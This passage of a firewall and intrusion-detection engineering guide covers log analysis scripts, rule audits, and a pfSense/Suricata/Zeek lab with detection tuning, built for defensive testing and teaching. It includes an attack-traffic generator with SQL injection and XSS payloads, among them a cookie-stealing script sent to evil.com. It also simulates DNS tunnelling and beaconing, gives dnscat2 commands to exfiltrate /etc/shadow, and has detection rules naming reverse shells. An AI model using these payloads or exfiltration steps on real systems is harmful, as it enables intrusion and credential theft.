            outbound_bytes[(e.src_ip, e.dst_ip)] += e.bytes_sent

    for (src, dst), total_bytes in outbound_bytes.items():
        if total_bytes > EXFIL_THRESHOLD_BYTES:
            findings.append({
                "type": "data_exfiltration",
                "severity": "HIGH",
                "source": src,
                "destination": dst,
                "bytes_transferred": total_bytes,
                "megabytes": round(total_bytes / 1_048_576, 1),
            })

    return findings


def detect_policy_violations(events: list[FirewallEvent]) -> list[dict]:
    """Detect zone policy violations (DMZ→INSIDE, suspicious ports)."""
    findings = []

    for e in events:
        # DMZ to INSIDE should never be allowed
        if (e.src_zone.lower() == "dmz" and e.dst_zone.lower() in ("inside", "internal", "lan")
                and e.action.lower() == "allow"):
            findings.append({
                "type": "zone_policy_violation",
                "severity": "CRITICAL",
                "source": e.src_ip,
                "destination": e.dst_ip,
                "port": e.dst_port,
                "description": "DMZ to INSIDE traffic allowed — possible misconfiguration or compromise",
                "timestamp": e.timestamp.isoformat(),
            })

        # Suspicious port usage from internal
        if is_internal(e.src_ip) and e.dst_port in SUSPICIOUS_PORTS and e.action.lower() == "allow":
            findings.append({
                "type": "suspicious_port",
                "severity": "MEDIUM",
                "source": e.src_ip,
                "destination": e.dst_ip,
                "port": e.dst_port,
                "timestamp": e.timestamp.isoformat(),
            })

    return findings


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <firewall_log.csv>", file=sys.stderr)
        sys.exit(1)

    filepath = sys.argv[1]
    print(f"[*] Parsing {filepath}...", file=sys.stderr)
    events = parse_log(filepath)
    print(f"[*] Loaded {len(events)} events", file=sys.stderr)

    all_findings = []
    all_findings.extend(detect_lateral_movement(events))
    all_findings.extend(detect_beaconing(events))
    all_findings.extend(detect_data_exfiltration(events))
    all_findings.extend(detect_policy_violations(events))

    # Sort by severity
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    all_findings.sort(key=lambda f: severity_order.get(f.get("severity", "LOW"), 4))

    report = {
        "analysis_timestamp": datetime.now().isoformat(),
        "events_analyzed": len(events),
        "findings_count": len(all_findings),
        "findings": all_findings,
    }

    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
```

### 9.2 Connection Table Monitoring

Monitor the conntrack table for anomalies:

```bash
#!/bin/bash
# conntrack_monitor.sh - Monitor connection tracking table health

CONNTRACK_MAX=$(cat /proc/sys/net/netfilter/nf_conntrack_max)
CONNTRACK_CURRENT=$(cat /proc/sys/net/netfilter/nf_conntrack_count)
USAGE_PCT=$((CONNTRACK_CURRENT * 100 / CONNTRACK_MAX))

echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] Conntrack: ${CONNTRACK_CURRENT}/${CONNTRACK_MAX} (${USAGE_PCT}%)"

# Alert thresholds
if [ "$USAGE_PCT" -gt 80 ]; then
    echo "CRITICAL: Connection table at ${USAGE_PCT}% capacity" | \
        logger -p daemon.crit -t conntrack_monitor
fi

# Top talkers by connection count
echo "--- Top 10 Source IPs by Connection Count ---"
conntrack -L 2>/dev/null | \
    awk '{for(i=1;i<=NF;i++) if($i ~ /src=/) print $i}' | \
    sort | uniq -c | sort -rn | head -10

# Half-open connections (potential SYN flood)
HALF_OPEN=$(conntrack -L 2>/dev/null | grep -c "SYN_SENT\|SYN_RECV")
echo "Half-open connections: ${HALF_OPEN}"
if [ "$HALF_OPEN" -gt 10000 ]; then
    echo "WARNING: Potential SYN flood — ${HALF_OPEN} half-open connections" | \
        logger -p daemon.warn -t conntrack_monitor
fi
```

### 9.3 Rule Hit-Count Optimization

Identify unused and low-frequency rules for cleanup:

```python
#!/usr/bin/env python3
"""
rule_hitcount_audit.py
Identify firewall rules with zero or minimal hits for policy cleanup.
Input: JSON export of firewall rules with hit counters.
"""

import json
import sys
from datetime import datetime, timedelta


def analyze_rules(rules_file: str, days_threshold: int = 90):
    with open(rules_file, "r") as f:
        rules = json.load(f)

    now = datetime.now()
    threshold_date = now - timedelta(days=days_threshold)

    zero_hit_rules = []
    low_hit_rules = []
    shadowed_candidates = []

    for rule in rules:
        hit_count = rule.get("hit_count", 0)
        last_hit = rule.get("last_hit_timestamp")
        rule_id = rule.get("id", "unknown")
        description = rule.get("description", "")

        if hit_count == 0:
            zero_hit_rules.append({
                "id": rule_id,
                "description": description,
                "created": rule.get("created"),
                "action": rule.get("action"),
                "recommendation": "REMOVE — zero hits, likely obsolete or shadowed",
            })
        elif last_hit:
            last_hit_dt = datetime.fromisoformat(last_hit)
            if last_hit_dt < threshold_date:
                low_hit_rules.append({
                    "id": rule_id,
                    "description": description,
                    "last_hit": last_hit,
                    "hit_count": hit_count,
                    "days_since_last_hit": (now - last_hit_dt).days,
                    "recommendation": f"REVIEW — no hits in {days_threshold}+ days",
                })

    report = {
        "audit_date": now.isoformat(),
        "total_rules": len(rules),
        "zero_hit_rules": len(zero_hit_rules),
        "stale_rules": len(low_hit_rules),
        "zero_hit_details": zero_hit_rules,
        "stale_rule_details": low_hit_rules,
    }

    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <rules_export.json>", file=sys.stderr)
        sys.exit(1)
    analyze_rules(sys.argv[1])
```

### 9.4 Policy Lifecycle Management

```
┌─────────────────────────────────────────────────────────────────┐
│                    POLICY LIFECYCLE                               │
├──────────┬──────────┬──────────┬──────────┬──────────┬──────────┤
│ REQUEST  │ REVIEW   │ APPROVE  │ IMPLEMENT│ VALIDATE │ AUDIT    │
│          │          │          │          │          │          │
│ Business │ Security │ CAB/     │ Deploy   │ Test     │ Periodic │
│ justif.  │ review   │ manager  │ to FW    │ access   │ review   │
│ Risk     │ Conflict │ Risk     │ Peer     │ Verify   │ Hit count│
│ assess.  │ analysis │ accept.  │ review   │ logging  │ Relevance│
│ Expiry   │ Shadowing│ Expiry   │ Rollback │ No side  │ Remove   │
│ date     │ check    │ approval │ plan     │ effects  │ stale    │
└──────────┴──────────┴──────────┴──────────┴──────────┴──────────┘
```

**Key principles:**

- Every rule has an owner and expiry date
- No permanent "any any" rules without VP-level exception
- Quarterly rule review for relevance
- Automated detection of shadowed/redundant rules
- Change window for production firewall modifications (except emergency)

### 9.5 Compliance Checking

#### CIS Benchmarks for Firewalls

| Control | Check |
|---------|-------|
| No implicit allow | Verify default deny is last rule |
| Management access restricted | SSH/HTTPS only from management VLAN |
| Logging enabled | All deny actions logged |
| NTP synchronized | Clock accuracy for forensics |
| Firmware current | Within vendor-supported version |
| Unused interfaces disabled | No active ports without policy |
| SNMP v3 only | No SNMPv1/v2c (cleartext community strings) |

#### Auditing Tools

| Tool | Vendor | Capability |
|------|--------|-----------|
| Nipper | Titania | Configuration audit, vulnerability assessment, compliance |
| Tufin SecureTrack | Tufin | Policy analysis, change tracking, risk scoring |
| AlgoSec | AlgoSec | Business-driven policy management, application connectivity |
| FireMon | FireMon | Real-time rule analysis, change management, compliance |
| Skybox | Skybox Security | Attack path analysis, vulnerability management |

### 9.6 Change Management for Firewall Rules

**Emergency change process (break-glass):**

1. Implement change immediately with verbal approval from security lead
2. Document within 4 hours
3. Formal review within 24 hours
4. Rollback if not approved in review
5. Post-incident review of the emergency

**Standard change process:**

1. Ticket creation with business justification
2. Security team reviews for risk, conflicts, shadowing
3. CAB approval (weekly change window)
4. Implementation during maintenance window
5. Validation testing
6. Ticket closure with evidence

---

## 10. Laboratorio Pratico

### 10.1 Lab Architecture: pfSense + Suricata + Zeek + ELK

```
┌─────────────────────────────────────────────────────────────────┐
│                        LAB NETWORK                               │
│                                                                  │
│  ┌──────────┐     ┌──────────────┐     ┌──────────────┐        │
│  │ Attacker │     │   pfSense    │     │   Victim     │        │
│  │ (Kali)   │─────│  + Suricata  │─────│  (Ubuntu)    │        │
│  │ 10.0.1.5 │     │  10.0.1.1    │     │  10.0.2.10   │        │
│  └──────────┘     │  10.0.2.1    │     └──────────────┘        │
│       WAN         │  10.0.3.1    │           LAN               │
│                   └──────┬───────┘                              │
│                          │ MGMT                                  │
│                   ┌──────▼───────┐                              │
│                   │    Zeek +    │                              │
│                   │  ELK Stack   │                              │
│                   │  10.0.3.10   │                              │
│                   └──────────────┘                              │
│                      MONITORING                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Components:**

- **pfSense VM:** 3 NICs (WAN, LAN, MGMT). Suricata installed via package manager.
- **Attacker (Kali):** On WAN segment. Simulates external threats.
- **Victim (Ubuntu Server):** On LAN segment. Runs vulnerable services (DVWA, Metasploitable).
- **Monitoring (ELK + Zeek):** On MGMT segment. Receives SPAN traffic and logs.

### 10.2 Network Segment Configuration

#### pfSense Interface Assignment

```xml
<interfaces>
  <wan>
    <if>vtnet0</if>
    <ipaddr>10.0.1.1</ipaddr>
    <subnet>24</subnet>
    <descr>WAN - Attacker Network</descr>
    <enable></enable>
    <spoofmac></spoofmac>
  </wan>
  <lan>
    <if>vtnet1</if>
    <ipaddr>10.0.2.1</ipaddr>
    <subnet>24</subnet>
    <descr>LAN - Protected Servers</descr>
    <enable></enable>
  </lan>
  <opt1>
    <if>vtnet2</if>
    <ipaddr>10.0.3.1</ipaddr>
    <subnet>24</subnet>
    <descr>MGMT - Monitoring</descr>
    <enable></enable>
    <descr>Management and Monitoring</descr>
  </opt1>
</interfaces>
```

#### Suricata on pfSense — Custom Rules

After installing the Suricata package on pfSense, add custom rules via the web interface or directly at `/usr/local/etc/suricata/suricata_<interface_id>_<uuid>/rules/custom.rules`:

```
# Custom rules for lab environment

# Detect Nmap SYN scan
alert tcp $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"SCAN Nmap SYN Scan Detected"; \
    flow:stateless; \
    flags:S,12; \
    threshold:type both, track by_src, count 50, seconds 10; \
    classtype:attempted-recon; \
    sid:9000001; rev:1;)

# Detect Nmap service version scan
alert tcp $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"SCAN Nmap Service Version Detection"; \
    flow:to_server,established; \
    content:"GET / HTTP"; depth:10; \
    content:"User-Agent: Nmap"; \
    classtype:attempted-recon; \
    sid:9000002; rev:1;)

# Detect Nikto web scanner
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"SCAN Nikto Web Scanner Detected"; \
    flow:to_server,established; \
    content:"Nikto"; http_header; \
    classtype:attempted-recon; \
    sid:9000003; rev:1;)

# Detect reverse shell via bash /dev/tcp
alert tcp $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"EXPLOIT Reverse Shell via /dev/tcp"; \
    flow:established; \
    content:"/dev/tcp/"; \
    classtype:trojan-activity; \
    sid:9000010; rev:1;)

# Detect Metasploit Meterpreter stage
alert tcp $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"EXPLOIT Metasploit Meterpreter Stage"; \
    flow:established,to_client; \
    content:"|4d 5a|"; depth:2; \
    content:"This program cannot be run in DOS mode"; distance:0; within:200; \
    classtype:trojan-activity; \
    sid:9000011; rev:1;)

# Detect data exfiltration via DNS (long queries)
alert dns $HOME_NET any -> any 53 ( \
    msg:"EXFIL Possible DNS Tunneling - Long Query"; \
    dns.query; \
    pcre:"/^[a-z0-9]{40,}\./i"; \
    threshold:type threshold, track by_src, count 10, seconds 60; \
    classtype:trojan-activity; \
    sid:9000020; rev:1;)

# Detect ICMP tunnel (oversized ICMP packets)
alert icmp $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"EXFIL Possible ICMP Tunneling - Large Payload"; \
    dsize:>100; \
    threshold:type threshold, track by_src, count 20, seconds 60; \
    classtype:trojan-activity; \
    sid:9000021; rev:1;)

# Detect credential dumping tool output patterns
alert tcp $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"EXFIL Possible Credential Dump Exfiltration"; \
    flow:established,to_server; \
    content:"Administrator:500:"; \
    classtype:trojan-activity; \
    sid:9000030; rev:1;)
```

### 10.3 Zeek Deployment for Lab

#### Zeek node.cfg

```ini
[zeek]
type=standalone
host=localhost
interface=eth1

[manager]
type=manager
host=localhost

[proxy-1]
type=proxy
host=localhost

[worker-1]
type=worker
host=localhost
interface=eth1
lb_method=pf_ring
lb_procs=4
```

#### Zeek local.zeek

```zeek
# local.zeek - Lab-specific Zeek configuration

@load base/frameworks/notice
@load base/protocols/conn
@load base/protocols/http
@load base/protocols/dns
@load base/protocols/ssl
@load base/protocols/ssh
@load base/protocols/ftp
@load base/protocols/smtp
@load base/files/extract

@load policy/protocols/ssl/validate-certs
@load policy/protocols/ssh/detect-bruteforcing
@load policy/protocols/http/detect-sqli
@load policy/misc/detect-traceroute

# JA3 fingerprinting
@load ja3

# Community ID for correlation with Suricata
@load policy/protocols/conn/community-id-logging

# File extraction settings
redef FileExtract::prefix = "/opt/zeek/extracted_files/";

# Extract PE files and scripts
event file_new(f: fa_file)
{
    if ( f$info?$mime_type )
    {
        local dominated = set(
            "application/x-dosexec",
            "application/x-executable",
            "application/javascript",
            "application/x-shellscript",
            "application/vnd.ms-office",
            "application/pdf"
        );
        
        if ( f$info$mime_type in dominated )
            Files::add_analyzer(f, Files::ANALYZER_EXTRACT);
    }
}

# Custom notice for lab exercises
module LabDetection;

export {
    redef enum Notice::Type += {
        Suspicious_User_Agent,
        Port_Scan_Detected,
        Large_DNS_Query
    };
}

event http_header(c: connection, is_orig: bool, name: string, value: string)
{
    if ( is_orig && name == "USER-AGENT" )
    {
        if ( /[Nn]map|[Nn]ikto|[Ss]qlmap|[Dd]irb|[Gg]obuster|[Bb]urp/ in value )
        {
            NOTICE([
                $note=Suspicious_User_Agent,
                $conn=c,
                $msg=fmt("Suspicious tool detected: %s", value),
                $sub=value,
                $identifier=cat(c$id$orig_h)
            ]);
        }
    }
}
```

### 10.4 ELK Stack Integration

#### Filebeat Configuration for Suricata + Zeek

```yaml
# /etc/filebeat/filebeat.yml
filebeat.inputs:

  # Suricata EVE JSON
  - type: log
    enabled: true
    paths:
      - /var/log/suricata/eve.json
    json.keys_under_root: true
    json.overwrite_keys: true
    json.add_error_key: true
    fields:
      source: suricata
    fields_under_root: false

  # Zeek logs (TSV format)
  - type: log
    enabled: true
    paths:
      - /opt/zeek/logs/current/conn.log
      - /opt/zeek/logs/current/http.log
      - /opt/zeek/logs/current/dns.log
      - /opt/zeek/logs/current/ssl.log
      - /opt/zeek/logs/current/notice.log
      - /opt/zeek/logs/current/files.log
      - /opt/zeek/logs/current/weird.log
    exclude_lines: ['^#']
    fields:
      source: zeek
    fields_under_root: false

  # pfSense filterlog
  - type: log
    enabled: true
    paths:
      - /var/log/pfSense/filter.log
    fields:
      source: pfsense
    fields_under_root: false

output.elasticsearch:
  hosts: ["http://10.0.3.10:9200"]
  index: "security-logs-%{+yyyy.MM.dd}"

setup.kibana:
  host: "http://10.0.3.10:5601"

processors:
  - add_host_metadata: ~
  - add_cloud_metadata: ~
  - community_id: ~
```

#### Elasticsearch Index Template

```json
{
  "index_patterns": ["security-logs-*"],
  "template": {
    "settings": {
      "number_of_shards": 2,
      "number_of_replicas": 0,
      "index.lifecycle.name": "security-logs-policy",
      "index.lifecycle.rollover_alias": "security-logs"
    },
    "mappings": {
      "properties": {
        "timestamp": { "type": "date" },
        "src_ip": { "type": "ip" },
        "dest_ip": { "type": "ip" },
        "src_port": { "type": "integer" },
        "dest_port": { "type": "integer" },
        "community_id": { "type": "keyword" },
        "alert": {
          "properties": {
            "signature": { "type": "text", "fields": { "keyword": { "type": "keyword" } } },
            "severity": { "type": "integer" },
            "category": { "type": "keyword" },
            "signature_id": { "type": "long" }
          }
        },
        "http": {
          "properties": {
            "hostname": { "type": "keyword" },
            "url": { "type": "text", "fields": { "keyword": { "type": "keyword" } } },
            "http_user_agent": { "type": "text" },
            "http_method": { "type": "keyword" },
            "status": { "type": "integer" }
          }
        },
        "dns": {
          "properties": {
            "query": { "type": "keyword" },
            "rrtype": { "type": "keyword" },
            "rcode": { "type": "keyword" }
          }
        },
        "tls": {
          "properties": {
            "sni": { "type": "keyword" },
            "ja3": { "type": "keyword" },
            "ja3s": { "type": "keyword" },
            "version": { "type": "keyword" }
          }
        },
        "fields.source": { "type": "keyword" },
        "geo": {
          "properties": {
            "src": { "type": "geo_point" },
            "dst": { "type": "geo_point" }
          }
        }
      }
    }
  }
}
```

### 10.5 Testing with Attack Traffic — PCAP Replay

#### Download and Replay Attack PCAPs

```bash
#!/bin/bash
# lab_attack_replay.sh
# Replay attack PCAPs through the lab for detection testing

INTERFACE="eth1"  # Interface connected to pfSense WAN
PCAP_DIR="/opt/lab/pcaps"

# Download well-known malicious PCAPs (if not present)
mkdir -p "$PCAP_DIR"

# Malware traffic analysis samples
declare -A PCAPS=(
    ["emotet"]="https://www.malware-traffic-analysis.net/2023/01/emotet-traffic.pcap.zip"
    ["cobalt_strike"]="https://www.malware-traffic-analysis.net/2023/02/cobalt-strike.pcap.zip"
    ["dridex"]="https://www.malware-traffic-analysis.net/2023/03/dridex-traffic.pcap.zip"
)

echo "[*] Replaying attack PCAPs..."

# Replay each PCAP with tcpreplay
for name in "${!PCAPS[@]}"; do
    pcap_file="${PCAP_DIR}/${name}.pcap"
    if [ -f "$pcap_file" ]; then
        echo "[+] Replaying ${name}..."
        tcpreplay --intf1="$INTERFACE" \
                  --multiplier=1.0 \
                  --timer=gtod \
                  "$pcap_file"
        echo "[+] ${name} complete. Checking Suricata alerts..."
        sleep 2
        # Show latest alerts related to this replay
        tail -20 /var/log/suricata/eve.json | \
            jq -r 'select(.event_type == "alert") | "\(.timestamp) [\(.alert.severity)] \(.alert.signature)"'
        echo "---"
    fi
done

echo "[*] All replays complete. Check ELK dashboard for full analysis."
```

#### Generate Custom Attack Traffic

```python
#!/usr/bin/env python3
"""
generate_attack_traffic.py
Generate specific attack patterns for IDS testing.
For authorized lab use only.
"""

import socket
import time
import struct
import random
import string
import base64
from typing import Optional


class AttackTrafficGenerator:
    """Generate controlled attack traffic for IDS/IPS testing."""

    def __init__(self, target_ip: str, target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port

    def sql_injection_attempts(self, count: int = 10) -> None:
        """Generate SQL injection payloads over HTTP."""
        payloads = [
            "' OR 1=1--",
            "' UNION SELECT username,password FROM users--",
            "1; DROP TABLE users--",
            "' AND 1=1 UNION SELECT null,table_name FROM information_schema.tables--",
            "admin'/*",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR '1'='1' /*",
            "-1 UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables--",
            "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' WAITFOR DELAY '0:0:5'--",
        ]

        for i in range(count):
            payload = payloads[i % len(payloads)]
            request = (
                f"GET /search?q={payload} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Connection: close\r\n\r\n"
            )
            self._send_tcp(request.encode())
            time.sleep(0.5)

    def xss_attempts(self, count: int = 10) -> None:
        """Generate XSS payloads over HTTP."""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(document.cookie)",
            "<body onload=alert('XSS')>",
            "'\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "<iframe src='javascript:alert(1)'>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
        ]

        for i in range(count):
            payload = payloads[i % len(payloads)]
            request = (
                f"GET /comment?text={payload} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Connection: close\r\n\r\n"
            )
            self._send_tcp(request.encode())
            time.sleep(0.5)

    def simulate_c2_beacon(self, interval: float = 30.0, 
                           jitter: float = 0.1, count: int = 20) -> None:
        """Simulate C2 beaconing pattern."""
        for i in range(count):
            # Simulate beacon check-in
            cookie = base64.b64encode(
                f"session_{random.randint(1000,9999)}_{i}".encode()
            ).decode()
            request = (
                f"GET /updates/check HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Cookie: SESSIONID={cookie}\r\n"
                f"Connection: close\r\n\r\n"
            )
            self._send_tcp(request.encode())

            # Add jitter to interval
            sleep_time = interval + random.uniform(-interval * jitter, interval * jitter)
            time.sleep(sleep_time)

    def simulate_dns_tunnel(self, dns_server: str = "8.8.8.8", count: int = 50) -> None:
        """Simulate DNS tunneling by sending encoded data in queries."""
        for i in range(count):
            # Generate random-looking subdomain (simulates encoded data)
            encoded_data = ''.join(
                random.choices(string.ascii_lowercase + string.digits, k=random.randint(40, 60))
            )
            domain = f"{encoded_data}.tunnel.evil-c2.example.com"

            # Construct DNS query packet
            transaction_id = random.randint(0, 65535)
            flags = 0x0100  # Standard query
            questions = 1

            packet = struct.pack(">HHHHHH", transaction_id, flags, questions, 0, 0, 0)

            # Encode domain name
            for label in domain.split("."):
                packet += struct.pack("B", len(label)) + label.encode()
            packet += b"\x00"  # Root label
            packet += struct.pack(">HH", 1, 1)  # Type A, Class IN

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(packet, (dns_server, 53))
                sock.close()
            except (socket.error, OSError):
                pass

            time.sleep(random.uniform(0.1, 0.5))

    def port_scan_simulation(self, port_range: tuple = (1, 1024)) -> None:
        """Simulate a port scan (SYN-like behavior)."""
        for port in range(port_range[0], port_range[1] + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
            except (socket.error, OSError):
                pass
            time.sleep(0.01)  # Slow enough to be realistic

    def _send_tcp(self, data: bytes, port: Optional[int] = None) -> None:
        target_port = port or self.target_port
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, target_port))
            sock.sendall(data)
            sock.recv(4096)
            sock.close()
        except (socket.error, OSError, ConnectionRefusedError):
            pass


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="IDS/IPS Test Traffic Generator (Lab Only)")
    parser.add_argument("--target", required=True, help="Target IP")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--attack", required=True,
                        choices=["sqli", "xss", "beacon", "dns_tunnel", "portscan"],
                        help="Attack type")
    parser.add_argument("--count", type=int, default=10, help="Number of attempts")
    args = parser.parse_args()

    gen = AttackTrafficGenerator(args.target, args.port)

    attack_map = {
        "sqli": gen.sql_injection_attempts,
        "xss": gen.xss_attempts,
        "beacon": gen.simulate_c2_beacon,
        "dns_tunnel": gen.simulate_dns_tunnel,
        "portscan": gen.port_scan_simulation,
    }

    print(f"[*] Generating {args.attack} traffic against {args.target}:{args.port}")
    attack_map[args.attack](count=args.count)
    print("[*] Complete. Check Suricata/Zeek alerts.")
```

### 10.6 Tuning False Positives

#### Systematic Tuning Process

```bash
#!/bin/bash
# suricata_fp_tuner.sh
# Identify and suppress false positive rules based on alert frequency analysis

EVE_LOG="/var/log/suricata/eve.json"
SUPPRESS_FILE="/etc/suricata/threshold.config"
FP_THRESHOLD=1000  # alerts per hour = likely false positive

echo "[*] Analyzing alerts from the past hour..."
HOUR_AGO=$(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%S)

# Top 20 alerting rules
echo "=== Top 20 Rules by Alert Count ==="
jq -r "select(.event_type==\"alert\" and .timestamp > \"${HOUR_AGO}\") | .alert.signature_id" \
    "$EVE_LOG" | sort | uniq -c | sort -rn | head -20

echo ""
echo "=== Rules exceeding FP threshold (${FP_THRESHOLD}/hour) ==="
jq -r "select(.event_type==\"alert\" and .timestamp > \"${HOUR_AGO}\") | \
    \"\(.alert.signature_id) \(.alert.signature) \(.src_ip)\"" "$EVE_LOG" | \
    awk '{print $1}' | sort | uniq -c | sort -rn | \
    awk -v thresh="$FP_THRESHOLD" '$1 > thresh {print $0}'

echo ""
echo "To suppress a rule by SID, add to ${SUPPRESS_FILE}:"
echo "  suppress gen_id 1, sig_id <SID>"
echo "  suppress gen_id 1, sig_id <SID>, track by_src, ip <IP>"
echo ""
echo "To rate-limit instead of suppress:"
echo "  event_filter gen_id 1, sig_id <SID>, type limit, track by_src, count 1, seconds 60"
```

#### Validation After Tuning

After suppressing a rule, validate it doesn't mask real attacks:

1. Re-run the attack PCAP
2. Verify the suppressed rule still fires for the attack traffic from other sources
3. If suppress is by source IP, ensure only the known-good source is excluded
4. Document why each suppression exists

### 10.7 Red Team Exercise: Firewall Bypass

#### Objective

Exfiltrate a file from the LAN victim through the pfSense firewall to the WAN attacker.

#### Attack: DNS Tunneling with dnscat2

**Attacker (10.0.1.5):**

```bash
# Start dnscat2 server (authoritative for tunnel.attacker.lab)
dnscat2-server tunnel.attacker.lab --no-cache
```

**Victim (10.0.2.10) — post-exploitation:**

```bash
# dnscat2 client (tunnels through corporate DNS)
./dnscat --dns "domain=tunnel.attacker.lab,server=10.0.2.1" --no-encryption
# Once session established:
# dnscat2> download /etc/shadow /tmp/exfil_shadow.txt
```

#### Blue Team Detection

Check Suricata alerts:

```bash
# Check for DNS tunnel alerts
jq -r 'select(.event_type=="alert" and .alert.signature | test("DNS.*[Tt]unnel"))' \
    /var/log/suricata/eve.json
```

Check Zeek DNS logs:

```bash
# Look for high-entropy, long DNS queries to single domain
cat /opt/zeek/logs/current/dns.log | zeek-cut query | \
    awk -F. '{print NF, length($0), $0}' | \
    sort -k2 -rn | head -20
```

Check the custom Zeek script for C2 beacon notices:

```bash
grep "C2_Beacon_Detected\|Large_DNS_Query" /opt/zeek/logs/current/notice.log
```

### 10.8 Blue Team Response: Blocking the Bypass

Once DNS tunneling is detected:

1. **Immediate:** Block the tunnel domain on pfSense DNS resolver (Unbound):

```
server:
    local-zone: "tunnel.attacker.lab" always_refuse
```

2. **Short-term:** Add Suricata rule to drop DNS tunnel traffic inline:

```
drop dns $HOME_NET any -> any 53 ( \
    msg:"DROP DNS Tunnel to known C2 domain"; \
    dns.query; content:"tunnel.attacker.lab"; nocase; \
    classtype:trojan-activity; \
    sid:9100001; rev:1;)
```

3. **Long-term:** Implement DNS security controls:
   - Force all DNS through internal resolvers (block port 53 outbound to all except authorized DNS)
   - Enable DNS query logging and monitoring
   - Deploy DNS-over-HTTPS detection (block DoH endpoints or use corporate DoH resolver)
   - Implement DNS response policy zones (RPZ) for threat domains

### 10.9 Comprehensive Lab Exercise Checklist

| Exercise | Red Team Action | Expected Blue Team Detection | Tool |
|----------|----------------|------------------------------|------|
| 1 | Nmap SYN scan | Alert: port scan threshold | Suricata |
| 2 | Nikto web scan | Alert: scanner user-agent | Zeek + Suricata |
| 3 | SQL injection on DVWA | Alert: SQLi pattern match | Suricata |
| 4 | Reverse shell (bash) | Alert: outbound shell pattern | Suricata |
| 5 | C2 beacon simulation | Notice: beaconing pattern | Zeek |
| 6 | DNS tunneling (dnscat2) | Alert: long DNS queries | Suricata + Zeek |
| 7 | ICMP tunneling | Alert: oversized ICMP | Suricata |
| 8 | Data exfil (large upload) | Log: bytes threshold | Firewall log analysis |
| 9 | Credential stuffing | Alert: auth failures | Wazuh |
| 10 | Lateral movement (SMB) | Alert: internal deny + scan | Firewall + Suricata |

---

## Appendice A — Quick Reference: Suricata vs Snort 3

| Feature | Suricata | Snort 3 |
|---------|----------|---------|
| Threading | Native multi-threaded | Multi-threaded (Snort 3) |
| Config format | YAML | Lua |
| Rule compatibility | Snort-compatible + extensions | Snort rules |
| Output format | EVE JSON (native) | Various (alert_json, unified2) |
| Protocol parsers | Rust-based (application-layer) | C++ inspectors |
| Lua scripting | Yes (detection + output) | Yes (inspectors) |
| Hardware accel | AF_PACKET, PF_RING, DPDK | DAQ (AF_PACKET, DPDK) |
| File extraction | Native | Native |
| Community | OISF (Open InfoSec Foundation) | Cisco Talos |
| License | GPL v2 | GPL v2 |

## Appendice B — nftables Cheat Sheet

| Task | Command |
|------|---------|
| List all rules | `nft list ruleset` |
| Add rule to chain | `nft add rule inet filter input tcp dport 22 accept` |
| Insert rule at position | `nft insert rule inet filter input position 5 tcp dport 80 accept` |
| Delete rule by handle | `nft delete rule inet filter input handle 7` |
| Flush chain | `nft flush chain inet filter input` |
| Add set element | `nft add element inet filter blacklist_v4 { 192.168.1.100 }` |
| Delete set element | `nft delete element inet filter blacklist_v4 { 192.168.1.100 }` |
| List counters | `nft list counters` |
| Monitor events | `nft monitor` |
| Export as JSON | `nft -j list ruleset` |
| Load from file | `nft -f /etc/nftables.conf` |
| Atomic replace | `nft -f - <<< "flush ruleset"; nft -f /etc/nftables.conf` |

## Appendice C — Ports and Protocols Reference for Firewall Engineering

| Service | Port(s) | Protocol | Notes |
|---------|---------|----------|-------|
| DNS | 53 | TCP/UDP | Zone transfers use TCP |
| DHCP | 67-68 | UDP | Server=67, Client=68 |
| HTTP | 80 | TCP | Cleartext — monitor for credentials |
| HTTPS | 443 | TCP | TLS inspection needed for visibility |
| SSH | 22 | TCP | Restrict to management VLAN |
| SMTP | 25, 587 | TCP | 587 = submission (authenticated) |
| IMAP | 993 | TCP | Always TLS |
| NTP | 123 | UDP | Amplification vector — restrict |
| SNMP | 161-162 | UDP | v3 only, restrict to MGMT |
| Syslog | 514, 1514 | TCP/UDP | Prefer TCP for reliability |
| LDAP | 389, 636 | TCP | 636 = LDAPS |
| Kerberos | 88 | TCP/UDP | AD authentication |
| SMB | 445 | TCP | Never expose to Internet |
| RDP | 3389 | TCP | Never expose to Internet |
| WinRM | 5985-5986 | TCP | 5986 = HTTPS |
| MySQL | 3306 | TCP | Restrict to app tier only |
| PostgreSQL | 5432 | TCP | Restrict to app tier only |
